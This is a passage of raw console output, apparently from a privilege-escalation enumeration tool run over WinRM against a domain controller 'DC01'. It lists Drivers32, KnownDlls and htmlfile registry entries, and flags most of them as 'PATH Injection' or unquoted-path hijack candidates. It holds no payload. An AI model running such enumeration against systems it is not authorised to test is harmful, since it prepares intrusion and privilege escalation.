WINRM       172.16.55.128   5985   DC01                 Key: msacm.msgsm610
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msgsm32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.i420
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: iyuv_32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.iyuv
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: iyuv_32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.mrle
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msrle32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.msvc
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msvidc32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.uyvy
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yuy2
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yvu9
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: tsbyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yvyu
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: wave
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                                    
WINRM       172.16.55.128   5985   DC01                 Key: wavemapper
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msacm32.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: aux
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: midi
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: midimapper
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: midimap.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: mixer
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: msacm.imaadpcm
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: imaadp32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: msacm.l3acm
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Windows\SysWOW64
WINRM       172.16.55.128   5985   DC01                 File: C:\Windows\SysWOW64\l3codeca.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: msacm.msadpcm
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msadp32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: msacm.msg711
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msg711.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: msacm.msgsm610
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msgsm32.acm
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.cvid
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: iccvid.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.i420
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: iyuv_32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.iyuv
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: iyuv_32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.mrle
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msrle32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.msvc
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msvidc32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.uyvy
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yuy2
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yvu9
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: tsbyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: vidc.yvyu
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msyuv.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: wave
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wdmaud.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32                                                                        
WINRM       172.16.55.128   5985   DC01                 Key: wavemapper
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: msacm32.drv
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\Software\Classes\htmlfile\shell\open\command                                                                                              
WINRM       172.16.55.128   5985   DC01                 Folder: C:\Program Files\Internet Explorer
WINRM       172.16.55.128   5985   DC01                 File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: *kernel32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: kernel32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: _wow64cpu
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wow64cpu.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: _wowarmhw
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wowarmhw.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: _xtajit
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: xtajit.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: _xtajit64
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: xtajit64.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: advapi32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: advapi32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: clbcatq
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: clbcatq.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: combase
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: combase.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: COMDLG32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: COMDLG32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: coml2
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: coml2.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: DifxApi
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: difxapi.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: gdi32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: gdi32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: gdiplus
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: gdiplus.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: IMAGEHLP
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: IMAGEHLP.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: IMM32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: IMM32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: MSCTF
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: MSCTF.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: MSVCRT
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: MSVCRT.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: NORMALIZ
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: NORMALIZ.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: NSI
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: NSI.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: ole32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: ole32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: OLEAUT32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: OLEAUT32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: PSAPI
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: PSAPI.DLL
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: rpcrt4
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: rpcrt4.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: sechost
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: sechost.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: Setupapi
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: Setupapi.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: SHCORE
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: SHCORE.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: SHELL32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: SHELL32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: SHLWAPI
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: SHLWAPI.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: user32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: user32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: WLDAP32
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: WLDAP32.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls                                                                                
WINRM       172.16.55.128   5985   DC01                 Key: wow64
WINRM       172.16.55.128   5985   DC01                 Folder: None (PATH Injection)
WINRM       172.16.55.128   5985   DC01                 File: wow64.dll
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
